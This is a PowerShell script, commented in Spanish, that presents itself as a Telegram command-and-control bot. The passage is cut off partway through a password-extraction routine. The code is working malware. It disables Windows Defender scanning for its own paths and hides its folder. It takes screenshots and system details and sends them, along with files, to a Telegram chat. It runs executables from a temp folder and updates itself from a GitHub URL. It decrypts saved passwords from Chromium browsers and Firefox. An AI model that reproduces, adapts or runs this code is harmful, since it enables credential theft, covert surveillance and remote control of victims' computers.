<#
    bot.ps1 - Telegram C2 Bot (PowerShell 5.1)
    - Claves por parametro -Token / -ChatId o desde config.ini
    - 100% ASCII (sin emojis)
    - Extraccion NATIVA de passwords de navegadores (fallback de hackbrowserdata)
    - Pausar/Reanudar/Cancelar por comandos MANUALES
    - Salidas de comandos / ls / dir en .txt
    - /edit sobrescribe el archivo original
#>

param(
    [string]$Token  = "",
    [string]$ChatId = ""
)

# === CONFIGURACION / RUTAS ===
$BaseDir     = "$env:APPDATA\CarpetaDos"
$ConfigFile  = "$BaseDir\config.ini"

if ([string]::IsNullOrWhiteSpace($Token) -or [string]::IsNullOrWhiteSpace($ChatId)) {
    if (Test-Path $ConfigFile) {
        Get-Content $ConfigFile | ForEach-Object {
            if ($_ -match '^\s*TOKEN\s*=\s*(.+?)\s*$')   { if ([string]::IsNullOrWhiteSpace($Token))  { $Token  = $matches[1].Trim() } }
            if ($_ -match '^\s*CHAT_ID\s*=\s*(.+?)\s*$') { if ([string]::IsNullOrWhiteSpace($ChatId)) { $ChatId = $matches[1].Trim() } }
        }
    }
}
if ([string]::IsNullOrWhiteSpace($Token) -or [string]::IsNullOrWhiteSpace($ChatId)) {
    Write-Host "Faltan TOKEN/CHAT_ID. Ejecuta el instalador o pasalos con -Token y -ChatId."
    exit 1
}

$ApiUrl      = "https://api.telegram.org/bot$Token"
$ApiFile     = "https://api.telegram.org/file/bot$Token"
$LogFile     = "$BaseDir\bot.log"
$HackPath    = "$BaseDir\hackbrowserdata.exe"
$LaZagnePath = "$BaseDir\lazagne.exe"
$StateFile   = "$BaseDir\bot_state.json"
$UploadDir   = "$BaseDir\uploads"
$RamDir      = "$env:TEMP\ram_exec"
$UpdateUrl   = "https://raw.githubusercontent.com/mayki35/win11_BOT/refs/heads/main/bot.ps1"

# === ESTADO DE SESION ===
$script:CurrentDir            = $PWD.Path
$script:LastStealTime         = $null
$script:ProcessedUpdates      = @{}
$script:Lock                  = New-Object System.Object
$script:ReverseShellActive    = $false
$script:ShellClient           = $null
$script:ShellStream           = $null
$script:FilesExfiltrated      = $false
$script:HackBrowserDataCompleted = $false
$script:LaZagneCompleted      = $false
$script:ArchivosHBDEnviados   = 0
$script:SendPaused            = $false
$script:SendCancelled         = $false
$script:FileQueue             = New-Object System.Collections.ArrayList
$script:PwAutoDone            = $false
$script:PwWaitNotified        = $false
$script:EditFiles             = @{}
$script:DocQueue              = New-Object System.Collections.ArrayList

New-Item -ItemType Directory -Path $BaseDir   -Force -ErrorAction SilentlyContinue | Out-Null
New-Item -ItemType Directory -Path $UploadDir -Force -ErrorAction SilentlyContinue | Out-Null

# === LOG ===
function Write-Log {
    param([string]$Message)
    $line = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Message"
    try { Add-Content -Path $LogFile -Value $line -ErrorAction SilentlyContinue } catch {}
    Write-Host $line
}

# === ANTIVIRUS: EXCLUSIONES ===
function Add-AvExclusions {
    try {
        Add-MpPreference -ExclusionPath $BaseDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath "$env:APPDATA\CarpetaUno" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionPath $RamDir -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
        Add-MpPreference -ExclusionProcess "wscript.exe" -ErrorAction SilentlyContinue
        if (Test-Path $HackPath)    { Add-MpPreference -ExclusionPath $HackPath    -ErrorAction SilentlyContinue }
        if (Test-Path $LaZagnePath) { Add-MpPreference -ExclusionPath $LaZagnePath -ErrorAction SilentlyContinue }
        # Atributos ocultos/sistema para que no lo toquen
        attrib +h +s +r $BaseDir 2>$null
        Write-Log "Exclusiones de Defender aplicadas."
    } catch { Write-Log "No se pudieron aplicar exclusiones: $($_.Exception.Message)" }
}

# === MENSAJES ===
function Send-Message {
    param([string]$Text)
    try {
        if ($Text.Length -gt 4000) { $Text = $Text.Substring(0,4000) + "`n...(truncado)" }
        $body = @{ chat_id = $ChatId; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
        return $true
    } catch { Write-Log "Error mensaje: $($_.Exception.Message)"; return $false }
}

function Send-Message-Buttons {
    param([string]$Text, $Keyboard)
    try {
        $body = @{ chat_id = $ChatId; text = $Text; reply_markup = $Keyboard } | ConvertTo-Json -Depth 8 -Compress
        Invoke-RestMethod -Uri "$ApiUrl/sendMessage" -Method Post -ContentType "application/json" -Body $body | Out-Null
    } catch { Write-Log "Error botones: $($_.Exception.Message)" }
}

function Answer-Callback {
    param([string]$Id, [string]$Text = "")
    try {
        $body = @{ callback_query_id = $Id; text = $Text } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri "$ApiUrl/answerCallbackQuery" -Method Post -ContentType "application/json" -Body $body | Out-Null
    } catch {}
}

# === ENVIO DE ARCHIVOS (cola si esta pausado) ===
function Send-File {
    param([string]$Path, [string]$Caption = "")
    if (-not (Test-Path $Path)) { return $false }
    if ($script:SendCancelled) { Write-Log "CANCELADO -> descartado: $(Split-Path $Path -Leaf)"; return $true }
    if ($script:SendPaused) {
        [void]$script:FileQueue.Add(@{ Path = $Path; Caption = $Caption })
        Write-Log "PAUSADO -> cola: $(Split-Path $Path -Leaf) (total: $($script:FileQueue.Count))"
        return $true
    }
    return (Send-File-Now -Path $Path -Caption $Caption)
}

function Send-File-Now {
    param([string]$Path, [string]$Caption = "")
    try {
        if (-not (Test-Path $Path)) { return $false }
        $curlArgs = @("-s","-X","POST","$ApiUrl/sendDocument","-F","chat_id=$ChatId","-F","document=@$Path")
        if ($Caption) { $curlArgs += "-F", "caption=$Caption" }
        $raw = & curl.exe @curlArgs 2>&1
        $result = $raw | ConvertFrom-Json
        if ($result.ok) { Write-Log "Enviado: $(Split-Path $Path -Leaf)"; return $true }
        Write-Log "Fallo envio: $raw"; return $false
    } catch { Write-Log "Error archivo: $($_.Exception.Message)"; return $false }
}

function Flush-FileQueue {
    if ($script:FileQueue.Count -eq 0) { Send-Message -Text "Cola vacia."; return }
    $total = $script:FileQueue.Count
    Send-Message -Text "Reanudando... enviando $total archivos."
    $ok = 0
    foreach ($item in @($script:FileQueue)) { if (Send-File-Now -Path $item.Path -Caption $item.Caption) { $ok++ }; Start-Sleep -Seconds 1 }
    $script:FileQueue.Clear()
    Send-Message -Text "Cola enviada: $ok/$total"
}

# === INFO SISTEMA ===
function Get-Info {
    try { $ip = (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { $ip = "Desconocida" }
    try { $os = (Get-CimInstance Win32_OperatingSystem).Caption } catch { $os = "Windows" }
    return "PC: $env:COMPUTERNAME | User: $env:USERNAME | IP: $ip | OS: $os"
}

# === NAVEGADORES ===
function Test-BrowsersOpen {
    $names = @("chrome","msedge","firefox","brave","opera","opera_gx","vivaldi","chromium","iexplore")
    $p = Get-Process $names -ErrorAction SilentlyContinue
    return (@($p).Count -gt 0)
}
function Stop-Browsers {
    Get-Process chrome,msedge,firefox,brave,opera,opera_gx,vivaldi,chromium -ErrorAction SilentlyContinue |
        Stop-Process -Force -ErrorAction SilentlyContinue
}

# === CAPTURA PANTALLA ===
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $b = [System.Windows.Forms.SystemInformation]::VirtualScreen
        if ($b.Width -le 0 -or $b.Height -le 0) { $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds }
        $bitmap   = New-Object System.Drawing.Bitmap($b.Width, $b.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphics.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size)
        $path = "$env:TEMP\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
        $bitmap.Save($path, [System.Drawing.Imaging.ImageFormat]::Png)
        $graphics.Dispose(); $bitmap.Dispose()
        $mon = ([System.Windows.Forms.Screen]::AllScreens).Count
        Send-File -Path $path -Caption "Screenshot full ($($b.Width)x$($b.Height)) - $mon monitor(es)"
        Remove-Item $path -Force -ErrorAction SilentlyContinue
        return $true
    } catch { Write-Log "Error screenshot: $($_.Exception.Message)"; Send-Message -Text "Error capturando: $($_.Exception.Message)"; return $false }
}

# === EJECUTAR .EXE EN RAM ===
function Invoke-ExeInRam {
    param([string]$Path, [string]$Arguments = "")
    if (-not (Test-Path $Path)) { Send-Message -Text "No existe: $Path"; return $false }
    try {
        $bytes = [System.IO.File]::ReadAllBytes($Path)
        New-Item -ItemType Directory -Path $RamDir -Force | Out-Null
        $name = [System.IO.Path]::GetFileName($Path)
        $tempExe = Join-Path $RamDir $name
        [System.IO.File]::WriteAllBytes($tempExe, $bytes)
        $psi = New-Object System.Diagnostics.ProcessStartInfo
        $psi.FileName = $tempExe; $psi.Arguments = $Arguments
        $psi.UseShellExecute = $false; $psi.RedirectStandardOutput = $true
        $psi.RedirectStandardError = $true; $psi.CreateNoWindow = $true
        $proc = [System.Diagnostics.Process]::Start($psi)
        $out = $proc.StandardOutput.ReadToEnd(); $err = $proc.StandardError.ReadToEnd()
        $proc.WaitForExit(300000); if (-not $proc.HasExited) { $proc.Kill() }
        $salida = ($out + "`n" + $err).Trim(); if ([string]::IsNullOrWhiteSpace($salida)) { $salida = "(sin salida)" }
        Send-Message -Text "RAM exec: $name`nExit: $($proc.ExitCode)`n`n$salida"
        Remove-Item $tempExe -Force -ErrorAction SilentlyContinue
        return $true
    } catch { Send-Message -Text "Error RAM exec: $($_.Exception.Message)"; return $false }
}

# === ACTUALIZAR CODIGO ===
function Update-Bot {
    $dest = $PSCommandPath
    if ([string]::IsNullOrWhiteSpace($dest)) { $dest = "$BaseDir\bot.ps1" }
    $tmp = "$env:TEMP\bot_update_$(Get-Date -Format 'yyyyMMdd_HHmmss').ps1"
    try {
        Send-Message -Text "Descargando actualizacion..."
        Invoke-WebRequest -Uri $UpdateUrl -OutFile $tmp -UseBasicParsing -TimeoutSec 60
        if (-not (Test-Path $tmp)) { Send-Message -Text "No se descargo."; return }
        $sz = (Get-Item $tmp).Length
        if ($sz -lt 1000) { Send-Message -Text "Archivo muy pequeno ($sz bytes), se cancela."; return }
        $bak = "$dest.bak"
        if (Test-Path $dest) { Copy-Item $dest $bak -Force -ErrorAction SilentlyContinue }
        Copy-Item $tmp $dest -Force
        Remove-Item $tmp -Force -ErrorAction SilentlyContinue
        Send-Message -Text "Codigo actualizado ($sz bytes). Backup: $bak`nReiniciando bot..."
        $psArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$dest`" -Token `"$Token`" -ChatId `"$ChatId`""
        Start-Process powershell.exe -ArgumentList $psArgs
        Start-Sleep -Seconds 2
        exit
    } catch { Send-Message -Text "Error actualizando: $($_.Exception.Message)" }
}

# ==========================================================
#  LECTOR SQLITE MINIMO (para Login Data y key4.db)
# ==========================================================
function Get-Varint {
    param([byte[]]$Data, [ref]$Off)
    [long]$result = 0; [int]$shift = 0
    while ($true) {
        if ($Off.Value -ge $Data.Length) { break }
        [int]$b = $Data[$Off.Value]; $Off.Value++
        $result = $result -bor ([long]($b -band 0x7f) -shl $shift)
        if (($b -band 0x80) -eq 0) { break }
        $shift += 7
        if ($shift -gt 63) { break }
    }
    return $result
}

function Read-DerLen {
    param([byte[]]$D, [ref]$P)
    $b = $D[$P.Value]; $P.Value++
    if ($b -band 0x80) {
        $n = $b -band 0x7f; $len = 0
        for ($i=0;$i -lt $n;$i++){ $len = ($len -shl 8) -bor $D[$P.Value]; $P.Value++ }
        return $len
    }
    return $b
}

function Read-CellPayload {
    param([byte[]]$Data, [int]$Start, [int]$PayloadLen, [int]$PageSize)
    $usable = $PageSize
    $maxLocal = $usable - 35
    $minLocal = [math]::Floor((($usable - 12) * 32) / 255) - 23
    $local = 0; $overflowPage = 0
    if ($PayloadLen -le $maxLocal) {
        $local = $PayloadLen
    } else {
        $k = $minLocal + (($PayloadLen - $minLocal) % ($usable - 4))
        if ($k -le $maxLocal) { $local = $k } else { $local = $minLocal }
        $opOff = $Start + $local
        $overflowPage = (([int]$Data[$opOff] -shl 24) -bor ([int]$Data[$opOff+1] -shl 16) -bor ([int]$Data[$opOff+2] -shl 8) -bor [int]$Data[$opOff+3])
    }
    $buf = New-Object System.Collections.Generic.List[byte]
    for ($i=0;$i -lt $local;$i++){ $buf.Add($Data[$Start+$i]) }
    $remaining = $PayloadLen - $local
    $op = $overflowPage
    while ($remaining -gt 0 -and $op -ne 0) {
        $pageOff = ($op - 1) * $PageSize
        $nextOp = (([int]$Data[$pageOff] -shl 24) -bor ([int]$Data[$pageOff+1] -shl 16) -bor ([int]$Data[$pageOff+2] -shl 8) -bor [int]$Data[$pageOff+3])
        $avail = [math]::Min($remaining, $usable - 4)
        for ($i=0;$i -lt $avail;$i++){ $buf.Add($Data[$pageOff+4+$i]) }
        $remaining -= $avail
        $op = $nextOp
    }
    return $buf.ToArray()
}

function Parse-Record {
    param([byte[]]$Payload)
    $p = 0
    $hdrLen = Get-Varint $Payload ([ref]$p)
    $serials = @()
    while ($p -lt $hdrLen) { $serials += (Get-Varint $Payload ([ref]$p)) }
    $vals = @()
    $vp = $hdrLen
    foreach ($s in $serials) {
        switch ($s) {
            0 { $vals += $null }
            1 { $vals += [int][sbyte]$Payload[$vp]; $vp+=1 }
            2 { $v = ([int]$Payload[$vp] -shl 8) -bor [int]$Payload[$vp+1]; if ($v -ge 32768){$v-=65536}; $vals += $v; $vp+=2 }
            3 { $v = ([int]$Payload[$vp] -shl 16) -bor ([int]$Payload[$vp+1] -shl 8) -bor [int]$Payload[$vp+2]; if($v -ge 8388608){$v-=16777216}; $vals+=$v; $vp+=3 }
            4 { $v = ([int]$Payload[$vp] -shl 24) -bor ([int]$Payload[$vp+1] -shl 16) -bor ([int]$Payload[$vp+2] -shl 8) -bor [int]$Payload[$vp+3]; $vals+=$v; $vp+=4 }
            5 { $v = ([long]$Payload[$vp] -shl 32) -bor ([long]$Payload[$vp+1] -shl 24) -bor ([long]$Payload[$vp+2] -shl 16) -bor ([long]$Payload[$vp+3] -shl 8) -bor [long]$Payload[$vp+4]; $vals+=$v; $vp+=5 }
            6 { $v = ([long]$Payload[$vp] -shl 40) -bor ([long]$Payload[$vp+1] -shl 32) -bor ([long]$Payload[$vp+2] -shl 24) -bor ([long]$Payload[$vp+3] -shl 16) -bor ([long]$Payload[$vp+4] -shl 8) -bor [long]$Payload[$vp+5]; $vals+=$v; $vp+=6 }
            7 { $vals += [System.BitConverter]::ToDouble($Payload, $vp); $vp+=8 }
            8 { $vals += 0 }
            9 { $vals += 1 }
            default {
                if ($s -ge 12) {
                    if ($s % 2 -eq 0) { $len = [int](($s-12)/2); if($len -gt 0){ $vals += $Payload[$vp..($vp+$len-1)] }; $vp += $len }
                    else { $len = [int](($s-13)/2); if($len -gt 0){ $vals += [System.Text.Encoding]::UTF8.GetString($Payload,$vp,$len) }; $vp += $len }
                } else { $vals += $null }
            }
        }
    }
    return ,$vals
}

function Read-BtreePage {
    param([byte[]]$Data, [int]$PageSize, [int]$PageNum)
    $rows = New-Object System.Collections.ArrayList
    $offset = ($PageNum - 1) * $PageSize
    if ($offset + 1 -ge $Data.Length) { return ,$rows }
    [int]$type = $Data[$offset]
    if ($type -eq 0x05) {
        [int]$nCells = ([int]$Data[$offset+3] -shl 8) -bor [int]$Data[$offset+4]
        $ptrArray = $offset + 12
        for ($i=0; $i -lt $nCells; $i++) {
            $cellPtr = $ptrArray + ($i*2)
            $cellOff = $offset + (([int]$Data[$cellPtr] -shl 8) -bor [int]$Data[$cellPtr+1])
            $childPage = (([int]$Data[$cellOff] -shl 24) -bor ([int]$Data[$cellOff+1] -shl 16) -bor ([int]$Data[$cellOff+2] -shl 8) -bor [int]$Data[$cellOff+3])
            foreach ($s in (Read-BtreePage $Data $PageSize $childPage)) { [void]$rows.Add($s) }
        }
        $right = (([int]$Data[$offset+8] -shl 24) -bor ([int]$Data[$offset+9] -shl 16) -bor ([int]$Data[$offset+10] -shl 8) -bor [int]$Data[$offset+11])
        foreach ($s in (Read-BtreePage $Data $PageSize $right)) { [void]$rows.Add($s) }
    } elseif ($type -eq 0x0D) {
        [int]$nCells = ([int]$Data[$offset+3] -shl 8) -bor [int]$Data[$offset+4]
        $ptrArray = $offset + 8
        for ($i=0; $i -lt $nCells; $i++) {
            $cellPtr = $ptrArray + ($i*2)
            $cellOff = $offset + (([int]$Data[$cellPtr] -shl 8) -bor [int]$Data[$cellPtr+1])
            $p = $cellOff
            $payloadLen = Get-Varint $Data ([ref]$p)
            $rowid = Get-Varint $Data ([ref]$p)
            $payload = Read-CellPayload $Data $p $payloadLen $PageSize
            if ($payload.Length -gt 0) { [void]$rows.Add((Parse-Record $payload)) }
        }
    }
    return ,$rows
}

function Parse-Columns {
    param([string]$Sql)
    $cols = @()
    if (-not $Sql) { return ,$cols }
    $i = $Sql.IndexOf('('); $j = $Sql.LastIndexOf(')')
    if ($i -lt 0 -or $j -le $i) { return ,$cols }
    $body = $Sql.Substring($i+1, $j-$i-1)
    foreach ($part in ($body -split ',')) {
        $t = $part.Trim()
        $first = ($t -split '\s+')[0]
        $first = $first.Trim('"','`','[',']',' ')
        if ($first -match '^(?i)(PRIMARY|UNIQUE|CHECK|FOREIGN|CONSTRAINT|KEY)$') { continue }
        if ($first) { $cols += $first }
    }
    return ,$cols
}

function Read-SqliteRows {
    param([string]$DbPath, [string]$TableName)
    $out = @()
    if (-not (Test-Path $DbPath)) { return ,$out }
    $data = [System.IO.File]::ReadAllBytes($DbPath)
    if ($data.Length -lt 100) { return ,$out }
    $magic = [System.Text.Encoding]::ASCII.GetString($data,0,15)
    if ($magic -ne "SQLite format 3") { return ,$out }
    $pageSize = ([int]$data[16] -shl 8) -bor [int]$data[17]
    if ($pageSize -eq 1) { $pageSize = 65536 }
    if ($pageSize -lt 512 -or $pageSize -gt 65536) { return ,$out }

    $masterRows = Read-BtreePage $data $pageSize 1
    $rootPage = 0; $createSql = ""
    foreach ($r in $masterRows) {
        if ($r.Count -ge 5 -and $r[0] -eq "table" -and $r[1] -eq $TableName) { $rootPage = [int]$r[3]; $createSql = $r[4]; break }
    }
    if ($rootPage -eq 0) { return ,$out }
    $cols = Parse-Columns $createSql
    if ($cols.Count -eq 0) { return ,$out }
    $rows = Read-BtreePage $data $pageSize $rootPage
    foreach ($r in $rows) {
        $h = @{}
        for ($i=0; $i -lt $cols.Count -and $i -lt $r.Count; $i++) { $h[$cols[$i]] = $r[$i] }
        $out += ,$h
    }
    return ,$out
}

# ==========================================================
#  DESCIFRADO DE PASSWORDS
# ==========================================================
Add-Type -AssemblyName System.Security -ErrorAction SilentlyContinue

if (-not ("AesGcmHelper" -as [type])) {
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public static class AesGcmHelper {
    [DllImport("bcrypt.dll")] static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm, string pszAlgId, string pszImplementation, uint dwFlags);
    [DllImport("bcrypt.dll")] static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint dwFlags);
    [DllImport("bcrypt.dll")] static extern uint BCryptSetProperty(IntPtr hObject, string pszProperty, byte[] pbInput, int cbInput, uint dwFlags);
    [DllImport("bcrypt.dll")] static extern uint BCryptGenerateSymmetricKey(IntPtr hAlgorithm, out IntPtr phKey, IntPtr pbKeyObject, int cbKeyObject, byte[] pbSecret, int cbSecret, uint dwFlags);
    [DllImport("bcrypt.dll")] static extern uint BCryptDestroyKey(IntPtr hKey);
    [DllImport("bcrypt.dll")] static extern uint BCryptDecrypt(IntPtr hKey, byte[] pbInput, int cbInput, ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo, byte[] pbIV, int cbIV, byte[] pbOutput, int cbOutput, out int pcbResult, uint dwFlags);

    [StructLayout(LayoutKind.Sequential)]
    struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO {
        public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce;
        public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag;
        public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags;
    }

    public static byte[] Decrypt(byte[] key, byte[] nonce, byte[] ciphertext, byte[] tag) {
        IntPtr hAlg = IntPtr.Zero, hKey = IntPtr.Zero;
        GCHandle hNonce = default(GCHandle), hTag = default(GCHandle);
        try {
            BCryptOpenAlgorithmProvider(out hAlg, "AES", null, 0);
            byte[] chainMode = System.Text.Encoding.Unicode.GetBytes("ChainingModeGCM\0");
            BCryptSetProperty(hAlg, "ChainingMode", chainMode, chainMode.Length, 0);
            BCryptGenerateSymmetricKey(hAlg, out hKey, IntPtr.Zero, 0, key, key.Length, 0);
            var info = new BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO();
            info.cbSize = Marshal.SizeOf(info); info.dwInfoVersion = 1;
            hNonce = GCHandle.Alloc(nonce, GCHandleType.Pinned);
            hTag = GCHandle.Alloc(tag, GCHandleType.Pinned);
            info.pbNonce = hNonce.AddrOfPinnedObject(); info.cbNonce = nonce.Length;
            info.pbTag = hTag.AddrOfPinnedObject(); info.cbTag = tag.Length;
            byte[] output = new byte[ciphertext.Length + 16];
            int outLen = 0;
            uint st = BCryptDecrypt(hKey, ciphertext, ciphertext.Length, ref info, null, 0, output, output.Length, out outLen, 0);
            if (st != 0) throw new Exception("BCryptDecrypt: " + st);
            byte[] res = new byte[outLen];
            Array.Copy(output, res, outLen);
            return res;
        } finally {
            if (hNonce.IsAllocated) hNonce.Free();
            if (hTag.IsAllocated) hTag.Free();
            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
            if (hAlg != IntPtr.Zero) BCryptCloseAlgorithmProvider(hAlg, 0);
        }
    }
}
"@
}

function Get-ChromiumKey {
    param([string]$LocalStatePath)
    if (-not (Test-Path $LocalStatePath)) { return $null }
    try {
        $json = Get-Content $LocalStatePath -Raw | ConvertFrom-Json
        $encB64 = $json.os_crypt.encrypted_key
        if (-not $encB64) { return $null }
        $enc = [Convert]::FromBase64String($encB64)
        $enc = $enc[5..($enc.Length-1)]  # quitar prefijo 'DPAPI'
        $key = [System.Security.Cryptography.ProtectedData]::Unprotect($enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return $key
    } catch { return $null }
}

function Decrypt-ChromiumPassword {
    param([byte[]]$Enc, [byte[]]$Key)
    if (-not $Enc -or $Enc.Length -eq 0) { return "" }
    try {
        if ($Enc.Length -ge 3) {
            $prefix = [System.Text.Encoding]::ASCII.GetString($Enc,0,3)
            if ($prefix -eq "v10" -or $prefix -eq "v11") {
                if (-not $Key) { return "(v10 sin clave)" }
                $nonce  = $Enc[3..14]
                $tag    = $Enc[($Enc.Length-16)..($Enc.Length-1)]
                $cipherLen = $Enc.Length - 31
                $cipher = if ($cipherLen -gt 0) { $Enc[15..(15+$cipherLen-1)] } else { [byte[]]@() }
                $dec = [AesGcmHelper]::Decrypt($Key, $nonce, $cipher, $tag)
                return [System.Text.Encoding]::UTF8.GetString($dec)
            }
        }
        $dec = [System.Security.Cryptography.ProtectedData]::Unprotect($Enc, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
        return [System.Text.Encoding]::UTF8.GetString($dec)
    } catch { return "" }
}

function Extract-ChromiumPasswords {
    $browsers = @(
        @{Name="Chrome";  Path="$env:LOCALAPPDATA\Google\Chrome\User Data"},
        @{Name="Edge";    Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data"},
        @{Name="Brave";   Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data"},
        @{Name="Opera";   Path="$env:APPDATA\Opera Software\Opera Stable"},
        @{Name="OperaGX"; Path="$env:APPDATA\Opera Software\Opera GX Stable"},
        @{Name="Vivaldi"; Path="$env:LOCALAPPDATA\Vivaldi\User Data"},
        @{Name="Chromium";Path="$env:LOCALAPPDATA\Chromium\User Data"}
    )
    $results = @()
    foreach ($b in $browsers) {
        $ud = $b.Path
        if (-not (Test-Path $ud)) { continue }
        $localState = Join-Path $ud "Local State"
        if (-not (Test-Path $localState)) {
            $parent = Split-Path $ud -Parent
            if (Test-Path (Join-Path $parent "Local State")) { $localState = Join-Path $parent "Local State" }
        }
        $key = Get-ChromiumKey $localState

        $profiles = @()
        $profiles += (Join-Path $ud "Default")
        $profiles += (Get-ChildItem $ud -Directory -Filter "Profile *" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })
        $profiles += (Get-ChildItem $ud -Directory -Filter "Default *" -ErrorAction SilentlyContinue | ForEach-Object { $_.FullName })

        foreach ($prof in $profiles) {
            $loginDb = Join-Path $prof "Login Data"
            if (-not (Test-Path $loginDb)) { continue }
            $tmp = "$env:TEMP\ld_$([guid]::NewGuid().ToString('N')).db"
            try { Copy-Item $loginDb $tmp -Force -ErrorAction SilentlyContinue } catch { continue }
            $rows = Read-SqliteRows $tmp "logins"
            Remove-Item $tmp -Force -ErrorAction SilentlyContinue
            foreach ($r in $rows) {
                $url = $r["origin_url"]; $user = $r["username_value"]; $pwdEnc = $r["password_value"]
                if (-not $url) { continue }
                $pwd = ""
                if ($pwdEnc -is [byte[]]) { $pwd = Decrypt-ChromiumPassword $pwdEnc $key }
                $results += [pscustomobject]@{ Browser=$b.Name; Profile=(Split-Path $prof -Leaf); URL=[string]$url; User=[string]$user; Password=[string]$pwd }
            }
        }
    }
    return $results
}

# --- Firefox ---
function Des3-CbcDecrypt {
    param([byte[]]$Key, [byte[]]$Iv, [byte[]]$Data)
    $td = New-Object System.Security.Cryptography.TripleDESCryptoServiceProvider
    $td.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $td.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $td.Key = $Key; $td.IV = $Iv
    $dec = $td.CreateDecryptor()
    return $dec.TransformFinalBlock($Data, 0, $Data.Length)
}

function Parse-DerTwoOctets {
    param([byte[]]$D)
    $res = @($null,$null)
    try {
        $p = 0
        if ($D[$p] -ne 0x30) { return ,$res }
        $p++; [void](Read-DerLen $D ([ref]$p))
        for ($k=0;$k -lt 2;$k++) {
            if ($p -ge $D.Length -or $D[$p] -ne 0x04) { return ,$res }
            $p++; $l = Read-DerLen $D ([ref]$p)
            $res[$k] = $D[$p..($p+$l-1)]; $p += $l
        }
    } catch {}
    return ,$res
}

function Parse-DerLastOctet {
    param([byte[]]$D)
    $last = $null
    try {
        $p = 0
        if ($D[$p] -ne 0x30) { return $D }
        $p++; $slen = Read-DerLen $D ([ref]$p)
        $end = [math]::Min($p + $slen, $D.Length)
        while ($p -lt $end) {
            $tag = $D[$p]; $p++
            $l = Read-DerLen $D ([ref]$p)
            if ($tag -eq 0x04) { $last = $D[$p..($p+$l-1)] }
            $p += $l
        }
    } catch {}
    return $last
}

function Get-FirefoxKeyMaterial {
    param([string]$Key4Path)
    try {
        $data = [System.IO.File]::ReadAllBytes($Key4Path)
        if ($data.Length -lt 32) { return $null }
        $globalSalt = $data[0..31]
        $meta = Read-SqliteRows $Key4Path "metadata"
        if (-not $meta -or $meta.Count -eq 0) { return $null }
        $item2 = $meta[0]["item2"]
        if (-not ($item2 -is [byte[]])) { return $null }
        $parts = Parse-DerTwoOctets $item2
        $iv = $parts[0]; $enc = $parts[1]
        if (-not $iv -or -not $enc) { return $null }
        $sha1 = [System.Security.Cryptography.SHA1]::Create()
        $k = $sha1.ComputeHash($globalSalt + [byte[]]@())
        while ($k.Length -lt 24) { $k = $k + $sha1.ComputeHash($k) }
        $key24 = $k[0..23]
        $dec = Des3-CbcDecrypt $key24 $iv $enc
        $master = Parse-DerLastOctet $dec
        if (-not $master) { return $null }
        return @{ GlobalSalt = $globalSalt; MasterKey = $master }
    } catch { return $null }
}

function Decrypt-FirefoxValue {
    param([string]$EncB64, [byte[]]$GlobalSalt, [byte[]]$MasterKey)
    try {
        $enc = [Convert]::FromBase64String($EncB64)
        if ($enc.Length -le 8) { return "" }
        $iv = $enc[0..7]
        $ct = $enc[8..($enc.Length-1)]
        $sha1 = [System.Security.Cryptography.SHA1]::Create()
        $k = $sha1.ComputeHash($GlobalSalt + $MasterKey)
        while ($k.Length -lt 24) { $k = $k + $sha1.ComputeHash($k) }
        $key24 = $k[0..23]
        $dec = Des3-CbcDecrypt $key24 $iv $ct
        return [System.Text.Encoding]::UTF8.GetString($dec)
    } catch { return "" }
}

function Extract-FirefoxPasswords {
    $profilesDir = "$env:APPDATA\Mozilla\Firefox\Profiles"
    $results = @()
    if (-not (Test-Path $profilesDir)) { return $results }
    foreach ($prof in (Get-ChildItem $profilesDir -Directory -ErrorAction SilentlyContinue)) {
        $logins = Join-Path $prof.FullName "logins.json"
        $key4   = Join-Path $prof.FullName "key4.db"
        if (-not (Test-Path $logins) -or -not (Test-Path $key4)) { continue }
        try {
            $km = Get-FirefoxKeyMaterial $key4
            if (-not $km) { continue }
            $json = Get-Content $logins -Raw | ConvertFrom-Json
            foreach ($lg in $json.logins) {
                $u = Decrypt-FirefoxValue $lg.encryptedUsername $km.GlobalSalt $km.MasterKey
                $p = Decrypt-FirefoxValue $lg.encryptedPassword $km.GlobalSalt $km.MasterKey
                $results += [pscustomobject]@{ Browser="Firefox"; Profile=$prof.Name; URL=[string]$lg.hostname; User=[string]$u; Password=[string]$p }
            }
        } catch {}
    }
    return $results
}

# === EXTRAER PASSWORDS (prioridad) ===
function Run-Passwords {
    Send-Message -Text "=== PASSWORDS (prioridad) ===`nCerrando navegadores y extrayendo..."
    $all = @()
    try { $all += Extract-ChromiumPasswords } catch { Write-Log "Chromium native: $_" }
